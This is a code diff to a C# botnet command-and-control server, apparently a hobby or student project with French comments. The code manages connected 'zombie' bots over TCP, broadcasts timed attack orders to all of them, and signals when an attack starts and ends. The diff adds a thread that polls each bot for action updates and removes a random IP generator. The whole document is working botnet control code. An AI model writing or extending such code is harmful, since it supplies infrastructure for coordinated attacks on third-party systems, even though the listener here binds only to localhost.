@@ -32,6 +32,8 @@ namespace BotnetAPP.Network {
         // Event
         public event EventConnectionHandler NewConnectedBot;
         public event EventConnectionHandler NewDisconnectionBot ;
+
+        public event EventConnectionHandler UpdateAction ; 
         public event EventConnectionHandler NewAttack ;
         public event EventConnectionHandler EndAttack ;
 
@@ -40,6 +42,7 @@ namespace BotnetAPP.Network {
         // Thread
         private Thread _checkingConnectionRequest ;
         private Thread _checkingBotDisconnection ;
+        private Thread _checkingChangeBotAction ; 
         private Thread _timerThread ; 
 
         private ASCIIEncoding _asen = new ASCIIEncoding();
@@ -54,6 +57,10 @@ namespace BotnetAPP.Network {
     // méthode permettant de déclencher les événements 
     public void OnNewConnectedBot(Zombie zombie) => NewConnectedBot?.Invoke(zombie);
     public void OnDisconnectionBot(Zombie zombie) => NewDisconnectionBot?.Invoke(zombie);
+
+    public void OnUpdateAction(Zombie zombie) {
+        UpdateAction?.Invoke(zombie) ;
+    }  
     public void OnNewAttack(Zombie zombie) => NewAttack?.Invoke(zombie) ;
     public void OnEndAttack(Zombie zombie) => EndAttack?.Invoke(zombie) ;
 
@@ -61,7 +68,6 @@ namespace BotnetAPP.Network {
 
         // Initialisation de la liste contenant les utilisateurs connectés 
         _connectedBot = new() ;
-
         TimerAttack = new() ; 
 
 
@@ -70,14 +76,17 @@ namespace BotnetAPP.Network {
         // Initialisation des threads et démarrage
 
         _checkingConnectionRequest = new Thread(ListenConnectionRequest) ;
-        _checkingBotDisconnection = new Thread(CheckBotsDisconnections) ; 
+        _checkingBotDisconnection = new Thread(CheckBotsDisconnections) ;
+        _checkingChangeBotAction = new Thread(UpdateBotAction) ;
 
 
         _checkingConnectionRequest.Name = "Checking connection request" ;
         _checkingBotDisconnection.Name = "Checking Bot Disconnection" ; 
+        _checkingChangeBotAction.Name = "Checking Change Action Bot " ; 
 
         _checkingConnectionRequest.Start() ;
-        _checkingBotDisconnection.Start() ; 
+        _checkingBotDisconnection.Start() ;
+        _checkingChangeBotAction.Start() ; 
 
     }
 
@@ -90,15 +99,13 @@ namespace BotnetAPP.Network {
 
     private void SetTimer(int second) {
         TimerAttack = new System.Timers.Timer() ;
+        
         TimerAttack.Interval = second*1000;
         TimerAttack.Enabled = true ;
         TimerAttack.AutoReset = false ;
 
         TimerAttack.Elapsed += AtEndAttack;
 
-        /*_timerThread = new Thread(StartTimer) ;
-        _timerThread.Name = "Timer Attack" ;
-        _timerThread.Start() ; */
 
 
     }
@@ -108,8 +115,9 @@ namespace BotnetAPP.Network {
     {
 
         OnEndAttack(new Zombie()) ; 
-            AttackInProgress = false ;
-            Console.WriteLine("L'attaque est fini ") ; 
+        AttackInProgress = false ;
+
+        Console.WriteLine("L'attaque est fini ") ; 
     }
 
 
@@ -149,15 +157,51 @@ namespace BotnetAPP.Network {
         SetTimer(order.nbSecond) ; 
         BroadcastNetMessage(Data<Order>.DataToXml(order)) ;
 
-        AttackInProgress = true ;
-
-        
-          
+        AttackInProgress = true ; 
     }
  
     
         
     private bool SocketConnected(Socket s) => !((s.Poll(1000, SelectMode.SelectRead) && (s.Available == 0)) || !s.Connected);
+
+
+    public void UpdateBotAction() {
+        while ( true ) {
+
+            try {
+                 lock (_connectedBot) {
+
+                 Dictionary<KeyValuePair<Zombie, Socket>, TypeAction> MiseAJourZombie = new() ;             
+
+                foreach ( KeyValuePair<Zombie, Socket> item in _connectedBot ) {
+                    string message = GetIncomingMessage(item.Value) ;
+
+                    MiseAJourZombie[item] = Data<Order>.XmlToData(message).action ; 
+
+                    Console.WriteLine("On passe par là "+message) ; 
+                }
+
+                foreach ( KeyValuePair<KeyValuePair<Zombie, Socket>, TypeAction> item in MiseAJourZombie  ) {
+                    
+                    // On supprime pour le mettre a jour
+                    _connectedBot.Remove(item.Key.Key) ;
+
+                    item.Key.Key.SetAction(item.Value) ; 
+
+                    _connectedBot[item.Key.Key] = item.Key.Value ;
+
+                    OnUpdateAction(item.Key.Key) ; 
+                    }
+                }
+            }
+            catch (Exception ex) {
+             Console.WriteLine(ex.Message) ; 
+            }
+
+             // Une seconde avant chaque vérification 
+         Thread.Sleep(1000);  
+        }
+    }
 
 
 
@@ -175,11 +219,18 @@ namespace BotnetAPP.Network {
                 }
             }
 
-            foreach ( Zombie zb in ZombieLost) {
+            lock (_connectedBot) {
+                foreach ( Zombie zb in ZombieLost) {
+                lock (_connectedBot) {
+
                 _connectedBot.Remove(zb) ;
-                OnDisconnectionBot(zb) ;  
+                OnDisconnectionBot(zb) ;
+
+                }  
             }
 
+            }
+            
             // Une seconde avant chaque vérification 
          Thread.Sleep(1000);   
         }
@@ -188,21 +239,15 @@ namespace BotnetAPP.Network {
         /*
         Ecoute les demandes de connexions 
         */
-
-
-
     public void ListenConnectionRequest() {
         
                 IPAddress ipAd = IPAddress.Parse("127.0.0.1");
 
                 TcpListener listen = new TcpListener(ipAd, _listenPort);
 
-
                 while(true) {
                     
                 listen.Start();
-
-               //IPEndPoint remoteIpEndPoint = listen.Client.RemoteEndPoint as IPEndPoint;
 
                 Console.WriteLine("Le serveur à démarrer sur le port " + _listenPort.ToString());
                 Console.WriteLine("L'adresse ip du serveur  :" + listen.LocalEndpoint);
@@ -237,13 +282,6 @@ namespace BotnetAPP.Network {
                     Console.WriteLine("[EXCEPTION] : " + ex.StackTrace) ; 
                 }
         }
-    }
-
-    
-    public static string GetRandomIpAddress()
-    {
-        var random = new Random();
-        return $"{random.Next(1, 255)}.{random.Next(0, 255)}.{random.Next(0, 255)}.{random.Next(0, 255)}";
     }
 
 
